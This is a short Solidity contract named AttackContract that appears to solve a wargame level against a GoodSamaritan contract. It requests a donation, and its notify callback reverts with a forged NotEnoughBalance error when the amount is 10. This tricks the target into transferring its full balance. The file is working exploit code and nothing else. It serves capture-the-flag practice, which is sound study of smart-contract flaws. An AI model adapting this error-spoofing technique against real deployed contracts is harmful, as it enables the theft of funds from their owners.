// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";
import "./INotifyable.sol";

contract AttackContract is INotifyable {

    error NotEnoughBalance();

    function request(address good) external {
        GoodSamaritan(good).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
